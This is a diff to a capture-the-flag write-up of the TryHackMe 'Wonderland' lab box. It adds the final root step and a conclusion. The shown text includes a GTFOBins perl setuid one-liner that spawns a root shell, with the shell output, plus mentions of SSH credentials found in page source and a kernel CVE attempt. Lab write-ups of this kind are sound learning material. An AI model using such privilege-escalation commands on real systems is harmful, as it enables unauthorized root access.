@@ -95,7 +95,7 @@ examining the source code showed what appeared to be the ssh credentiels for the
 
 ![ssh creds](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/wonder/creds.png)
 
-### I'm in
+### \[hacker voice\]I'm in
 
 once I got on the box, I found a file called `root.txt` which has the final flag we have to find, this seemed a bit weird since I haven't found the `user.txt` flag yet.
 
@@ -149,8 +149,6 @@ Linux wonderland 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020
 ```
 
 looking up the kernel version led me to try CVE-018-18955 on the box, which kind of gave me a "root prompt" but without any special priveleges, and I have no clue why
-
-# I'll take care of this part later
 
 I took a moment to find the `user.txt` flag, I ran couple `find` commands but nothing came up, I started running out of ideas till I viewed the hint on the website
 
@@ -269,14 +267,26 @@ hatter@wonderland:/home/hatter$ ls -lh /usr/bin/perl5.26.1 /usr/bin/perl
 -rwxr-xr-- 2 root hatter 2.1M Nov 19  2018 /usr/bin/perl5.26.1
 ```
 
-after looking up those executables in [gtfo bins](https://gtfobins.github.io/) I found a command I can use to spawn a root shell, and it worked on one of the binaries!
+after looking up those executables in [gtfo bins](https://gtfobins.github.io/) I found a command I can use to spawn a root shell, and it worked on both binaries!
 
 ```bash
 hatter@wonderland:/home/hatter$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 bash: /usr/bin/perl: Permission denied
-hatter@wonderland:/home/hatter$ /usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
-$ whoami
+hatter@wonderland:~$ /usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+# whoami
 root
-$
+# 
 ```
 ### I'm groot
+
+now we're root we can just get the `root.txt` flag
+
+```bash
+# cat /home/alice/root.txt
+thm{REDACTED}
+# 
+```
+
+### conclusion
+
+wonderland was a really nice box, it had me banging my head against the wall but I learned couple new tricks that'll come handy in the future, I hope next time there would be less to no peaking at all
